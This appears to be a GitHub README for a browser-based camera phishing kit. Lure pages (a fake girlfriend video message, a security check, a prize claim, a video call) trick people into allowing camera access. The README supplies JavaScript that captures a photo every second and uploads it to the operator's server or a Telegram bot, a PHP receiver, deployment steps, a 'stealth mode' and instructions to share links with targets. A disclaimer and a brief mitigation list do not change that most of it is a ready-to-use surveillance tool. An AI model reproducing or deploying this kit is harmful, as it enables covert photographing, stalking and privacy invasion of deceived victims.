# 📸 Advance Camera Hack Tool

<div align="center">

![Version](https://img.shields.io/badge/version-1.0-red.svg)
![Platform](https://img.shields.io/badge/platform-Web-blue.svg)
![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white)
![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=black)
![License](https://img.shields.io/badge/license-Educational-orange.svg)

**Advanced Web-Based Camera Exploitation Tool for Social Engineering**

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Scenarios](#-scenarios) • [Legal](#-legal-disclaimer)

</div>

---

## 📋 Overview

Advance Camera Hack Tool is a sophisticated web-based social engineering tool designed for security professionals to demonstrate camera exploitation vulnerabilities. This tool leverages realistic social engineering scenarios to educate users about the risks of granting camera permissions to untrusted websites.

### 🎯 Key Highlights

- **Web-Based Deployment** - No installation required, runs in browser
- **Social Engineering Scenarios** - Pre-configured convincing templates
- **Real-Time Capture** - Captures photos every second automatically
- **Server Integration** - Sends captured images to specified server
- **Cross-Platform** - Works on any device with camera and browser
- **Educational Focus** - Raises awareness about camera security risks

---

## ✨ Features

### 🔧 Core Functionality
- **Automatic Camera Access** - Requests camera permission via browser API
- **Continuous Capture** - Takes photos every second once access granted
- **Server Upload** - Automatically uploads images to configured server
- **Multiple Scenarios** - Pre-built social engineering templates
- **Responsive Design** - Works on desktop, tablet, and mobile devices
- **Stealth Mode** - Minimal UI to avoid suspicion

### 📱 Social Engineering Scenarios
- **Girlfriend Camera Hack** - Relationship-based social engineering
- **Security Verification** - Fake security check scenario
- **Prize Winner** - Lottery/prize claim scenario
- **Account Verification** - Fake account verification
- **Video Call Setup** - Fake video chat initialization
- **Custom Scenarios** - Easy to create your own templates

### 🌐 Technical Features
- **HTML5 Camera API** - Uses getUserMedia() for camera access
- **AJAX Upload** - Asynchronous image upload to server
- **Base64 Encoding** - Efficient image data transmission
- **Error Handling** - Graceful fallback on permission denial
- **Cross-Browser** - Compatible with Chrome, Firefox, Safari, Edge

---

## 🚀 Installation

### Prerequisites
```bash
# Required
- Web server (Apache, Nginx, or Python SimpleHTTPServer)
- PHP 7.0+ (for server-side image handling)
- Modern web browser with camera support

# Optional
- SSL certificate (for HTTPS - required by some browsers)
- Domain name
- Hosting service (for remote deployment)
```

### Quick Setup

#### Option 1: Local Testing
```bash
# Clone repository
git clone https://github.com/offsecnight/Advance-Camera-Hack-Tool.git
cd Advance-Camera-Hack-Tool

# Start Python web server
python3 -m http.server 8080

# Access in browser
# http://localhost:8080
```

#### Option 2: Apache/Nginx Deployment
```bash
# Clone to web root
cd /var/www/html
git clone https://github.com/offsecnight/Advance-Camera-Hack-Tool.git

# Set permissions
chmod -R 755 Advance-Camera-Hack-Tool
chown -R www-data:www-data Advance-Camera-Hack-Tool

# Access via domain
# http://yourdomain.com/Advance-Camera-Hack-Tool
```

#### Option 3: HTTPS Setup (Recommended)
```bash
# Install certbot
sudo apt install certbot python3-certbot-apache

# Get SSL certificate
sudo certbot --apache -d yourdomain.com

# Access via HTTPS
# https://yourdomain.com/Advance-Camera-Hack-Tool
```

---

## 📖 Usage

### Step 1: Configure Server Endpoint

Edit `script.js`:

```javascript
// Configure your server endpoint
const SERVER_URL = 'https://yourserver.com/upload.php';
const CAPTURE_INTERVAL = 1000; // 1 second

function uploadImage(imageData) {
    fetch(SERVER_URL, {
        method: 'POST',
        body: JSON.stringify({ image: imageData }),
        headers: { 'Content-Type': 'application/json' }
    });
}
```

### Step 2: Set Up Server-Side Handler

Create `upload.php`:

```php
<?php
// upload.php - Server-side image handler

header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    if (isset($data['image'])) {
        $image = $data['image'];
        $image = str_replace('data:image/png;base64,', '', $image);
        $image = str_replace(' ', '+', $image);
        $imageData = base64_decode($image);
        
        // Save with timestamp
        $filename = 'captures/img_' . time() . '_' . uniqid() . '.png';
        file_put_contents($filename, $imageData);
        
        echo json_encode(['success' => true, 'file' => $filename]);
    }
}
?>
```

### Step 3: Choose Social Engineering Scenario

Edit `index.html` to select scenario:

```html
<!-- Girlfriend Camera Hack Scenario -->
<div class="scenario girlfriend">
    <h1>💕 Surprise Video Message</h1>
    <p>Your girlfriend wants to send you a special video message!</p>
    <p>Click "Allow" to view her message</p>
    <button onclick="startCamera()">View Message</button>
</div>

<!-- Security Verification Scenario -->
<div class="scenario security">
    <h1>🔒 Security Verification Required</h1>
    <p>For your account security, we need to verify your identity</p>
    <p>Please allow camera access to continue</p>
    <button onclick="startCamera()">Verify Identity</button>
</div>
```

### Step 4: Deploy and Share

```bash
# Get your public URL
# Share link with target (for authorized testing only!)

# Example URLs:
# https://yourdomain.com/surprise-message
# https://yourdomain.com/verify-account
# https://yourdomain.com/claim-prize
```

### Step 5: Monitor Captures

```bash
# View captured images on server
cd captures/
ls -lh

# Images are saved as:
# img_1709712345_abc123.png
# img_1709712346_def456.png
```

---

## 🎮 Project Structure

```
Advance-Camera-Hack-Tool/
├── index.html              # Main HTML page
├── style.css               # Styling and themes
├── script.js               # Camera capture logic
├── upload.php              # Server-side upload handler
├── scenarios/              # Pre-built scenarios
│   ├── girlfriend.html
│   ├── security.html
│   ├── prize.html
│   └── videocall.html
├── captures/               # Captured images directory
├── assets/
│   ├── images/
│   └── icons/
├── README.md
└── LICENSE
```

---

## 🎭 Social Engineering Scenarios

### 1. Girlfriend Camera Hack
```html
<div class="scenario">
    <h1>💕 Surprise Video Message</h1>
    <p>Your girlfriend sent you a private video message</p>
    <p>Click allow to watch it now!</p>
</div>
```

### 2. Security Verification
```html
<div class="scenario">
    <h1>🔒 Account Security Check</h1>
    <p>We detected unusual activity on your account</p>
    <p>Verify your identity to secure your account</p>
</div>
```

### 3. Prize Winner
```html
<div class="scenario">
    <h1>🎉 Congratulations! You Won!</h1>
    <p>You've been selected to win $1000!</p>
    <p>Verify your identity to claim your prize</p>
</div>
```

### 4. Video Call Setup
```html
<div class="scenario">
    <h1>📹 Video Call Starting...</h1>
    <p>Someone is calling you</p>
    <p>Allow camera access to answer</p>
</div>
```

### 5. Custom Scenario Template
```html
<div class="scenario custom">
    <h1>Your Custom Title</h1>
    <p>Your custom message here</p>
    <button onclick="startCamera()">Your CTA Button</button>
</div>
```

---

## 🔧 Customization

### Modify Capture Interval

```javascript
// script.js
const CAPTURE_INTERVAL = 2000; // Change to 2 seconds
const CAPTURE_INTERVAL = 500;  // Change to 0.5 seconds
```

### Change Image Quality

```javascript
// script.js
function captureImage() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    // Adjust quality (0.0 to 1.0)
    const imageData = canvas.toDataURL('image/jpeg', 0.8); // 80% quality
    uploadImage(imageData);
}
```

### Add Telegram Integration

```javascript
// script.js
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

function sendToTelegram(imageData) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    
    fetch(url, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            photo: imageData
        })
    });
}
```

### Enable Front/Back Camera Selection

```javascript
// script.js
async function startCamera(facingMode = 'user') {
    const constraints = {
        video: {
            facingMode: facingMode // 'user' or 'environment'
        }
    };
    
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
}

// Toggle camera
function switchCamera() {
    currentCamera = currentCamera === 'user' ? 'environment' : 'user';
    startCamera(currentCamera);
}
```

---

## 🛡️ Security & Privacy

### Browser Permissions

Modern browsers require:
- **HTTPS**: Camera access only works on HTTPS (except localhost)
- **User Consent**: User must explicitly allow camera access
- **Indicator**: Browser shows camera active indicator
- **Revocable**: User can revoke permission anytime

### Detection Indicators

Users can detect camera access by:
- Camera LED indicator on device
- Browser camera icon in address bar
- System camera usage notification
- Battery drain from continuous capture

### Mitigation Techniques

To protect against this attack:
- Never grant camera permission to untrusted sites
- Check URL carefully before allowing permissions
- Use browser extensions to block camera access
- Disable camera in browser settings when not needed
- Cover camera with physical cover when not in use

---

## 🐛 Troubleshooting

### Camera Permission Denied
```javascript
// Handle permission denial
navigator.mediaDevices.getUserMedia({ video: true })
    .catch(error => {
        console.error('Camera access denied:', error);
        alert('Camera access is required');
    });
```

### HTTPS Required Error
```bash
# Solution: Use HTTPS or localhost
# For testing: use localhost
python3 -m http.server 8080

# For production: get SSL certificate
sudo certbot --apache -d yourdomain.com
```

### Images Not Uploading
```bash
# Check PHP upload directory permissions
chmod 777 captures/

# Check PHP error log
tail -f /var/log/apache2/error.log

# Test upload endpoint
curl -X POST https://yourserver.com/upload.php \
  -H "Content-Type: application/json" \
  -d '{"image":"test"}'
```

### Cross-Origin Issues
```php
// Add CORS headers in upload.php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
```

---

## 📚 Educational Use Cases

### Security Awareness Training
- Demonstrate social engineering risks
- Show how camera permissions can be exploited
- Teach users to verify website authenticity
- Educate about browser security indicators

### Penetration Testing
- Test organization's security awareness
- Assess user susceptibility to social engineering
- Evaluate browser security policies
- Identify security training gaps

### Research & Development
- Study user behavior patterns
- Analyze permission grant rates
- Test browser security features
- Develop countermeasures

---

## 🤝 Contributing

Contributions are welcome! Areas for improvement:

- Additional social engineering scenarios
- Better UI/UX designs
- Mobile optimization
- Video recording capability
- Encrypted transmission
- Database integration

---

## 📜 Changelog

### Version 1.0 (Current)
- ✅ Initial release
- ✅ Basic camera capture functionality
- ✅ Server upload integration
- ✅ Multiple social engineering scenarios
- ✅ Responsive design
- ✅ Cross-browser compatibility

---

## ⚠️ LEGAL DISCLAIMER

**READ CAREFULLY BEFORE USE**

This tool is provided for **EDUCATIONAL and AUTHORIZED SECURITY TESTING PURPOSES ONLY**.

### Authorized Use Only
- ✅ Security awareness training with consent
- ✅ Authorized penetration testing
- ✅ Educational demonstrations in controlled environments
- ✅ Research with proper ethical approval

### Prohibited Use
- ❌ Unauthorized surveillance
- ❌ Privacy invasion
- ❌ Stalking or harassment
- ❌ Any illegal activities

### Legal Responsibility
- **YOU** are solely responsible for your actions
- **YOU** must obtain explicit consent before use
- **YOU** must comply with all privacy laws
- **YOU** accept all legal consequences of misuse

### Privacy Laws
This tool may violate:
- GDPR (Europe)
- CCPA (California)
- Computer Fraud and Abuse Act (USA)
- Local privacy and surveillance laws

### Developer Liability
The developer (NIGHTKING) assumes **NO RESPONSIBILITY** for:
- Misuse of this tool
- Privacy violations
- Legal consequences
- Damage or harm caused

**UNAUTHORIZED SURVEILLANCE IS ILLEGAL**

Violations may result in criminal prosecution, civil lawsuits, imprisonment, and heavy fines.

**USE AT YOUR OWN RISK**

---

## 📞 Contact & Support

### Developer
- **Name**: NIGHTKING
- **GitHub**: [@offsecnight](https://github.com/offsecnight)
- **Repository**: [Advance-Camera-Hack-Tool](https://github.com/offsecnight/Advance-Camera-Hack-Tool)

### Support
- **Issues**: [GitHub Issues](https://github.com/offsecnight/Advance-Camera-Hack-Tool/issues)
- **Discussions**: [GitHub Discussions](https://github.com/offsecnight/Advance-Camera-Hack-Tool/discussions)

---

## 📄 License

This project is licensed under the **Educational Use License**.

**Key Points:**
- Free for educational and research purposes
- Requires explicit consent for testing
- No warranty provided
- Developer not liable for misuse

---

## 🌟 Acknowledgments

- Web Security Community
- Social Engineering Researchers
- Privacy Advocates
- Open Source Contributors

---

## 🔗 Related Projects

- [DexSploitX](https://github.com/offsecnight/DexSploitX) - Advanced Android RAT Framework
- [Android-13-reverse-shell](https://github.com/offsecnight/Android-13-reverse-shell) - Android Reverse Shell
- [Social Engineer Toolkit](https://github.com/trustedsec/social-engineer-toolkit)

---

<div align="center">

**⭐ Star this repository if you find it useful!**

**Made with ❤️ by NIGHTKING**

**For Authorized Security Testing Only**

</div>
